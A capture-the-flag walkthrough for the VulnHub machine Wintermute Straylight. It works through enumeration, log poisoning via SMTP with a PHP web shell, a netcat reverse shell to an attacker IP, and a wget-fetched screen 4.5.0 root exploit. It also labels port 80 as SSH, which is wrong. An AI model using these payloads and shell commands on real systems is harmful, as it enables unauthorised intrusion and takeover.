# VulnHub Walkthrough: ❄ Wintermute - Straylight

## Part 1

1. Find Target (computer/device):
     * `netdiscover -r <Kali IP>`

2. On your Kali machine, map straylight's IP to a domain to shorten the host name:
     * `nano /etc/hosts` then add the following line `<target IP> stray.light`

3. Scan the Target network:
     * `nmap -A -p0-65535 <007 IP>`: "-A", Enables OS detection, version detection, script-scanning, and trace-route
     * Open ports: *SMTP*(25), *SSH*(80), & *ppp* (3000) - */lua/login.lua?referer=/*

4. Run gobuster (helps you find extra directories/files):
     * `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -t 20 -u http://stray.light/`
     * *dir*: Uses directory/file bruteforcing mode
     * *-w*: Path to wordlist
     * *-t*: number of concurrent threads

5. We find *http://stray.light/freeside/*

## Part 2

6. Go to *http://stray.light:3000/lua/login.lua?referer/*:
     * Login using *admin*:*admin*
     * Go to /turing-bolo/

7. PHP Injection: We see '*.log*' files which helps determine a Local File Inclusion (LFI) vulnerability
      * We are able to do */bolo=/var/log/mail*

8. Note that to inject a command prompt onto php: `<?php echo shell_exec($_GET['cmd']);?>`

9. Just use the *SMTP* server to mail the php injection code:
     * Either use telnet (`telnet stray.light 25`) or nc (`nc stray.light 25`)
     * `HELO hacker`
     * `MAIL FROM: "hacker <?php ?>`, replace <?php ?> with the code shown in step 8.
     * `RCPT TO: root`
     * `DATA`
     * `.`

## Part 3

10. View source code for `php?bolo=/var/log/mail&cmd=id`
     * notice php injection was successfully received by root

11. Check if netcat is installed - `.php?bolo=/var/log/mail&cmd=which nc` --> */bin/nc* is shown/returned

12. (**Do step 13 first**) Recall start listener on attack box to catch shell: (linux) `nc <ip> <port> -e /bin/bash` | (windows) `nc <ip> <port> -e cmd.exe`:
   * Example: `nc 10.0.0.1 1234 -e /bin/bash`.
  * To use ^ this (safely) for our case we have to make sure its in url encoded format --> so put %20 inbetween spaces - Example: `&cmd=nc%2010.0.0.1%201234%20-e%20/bin/bash`

13. Before running step 12, make sure you start up a listener: `nc -lvnp 9001`

## Part 4

14. Once connected, run `id` to verify

15. Spawn in a shell! --> `python -c "import pty; pty.spawn('/bin/bash')"`

16. Check out passwd file: `cat /etc/passwd`
     * Notice 2 users have /bin/bash permissions: ***wintermute*** & ***turing-police***
     * We notice that they're both useless for Wintermute - Straylight: `ls -halt /home/wintermute`(empty), `ls -halt /home/turing-police` (empty)

17. Check for any unordinary programs/binaries installed on system:
     * `find / -perm -4000 -type f -ls 2>/dev/null`, notice unusual "*screen-4.5.0*"

18. Scan for exploits using searchsploit:
     * `searchsploit screen 4.5.0` --> returns 1 exploit
     * Mirror/Download the exploit file onto Kali: `searchsploit -m 41154`

19. Create a simple python server on Kali so the target machine can access the exploit file (41154.sh)

## Part 5

20. On the target box:
     * `cd /tmp` --> `wget http://<Kali IP>:80/41154.sh`
     * `./41154.sh`

21. Cash, you're in.
     * `cd /root` --> `ls -halt` (I think the flag is here somewhere)
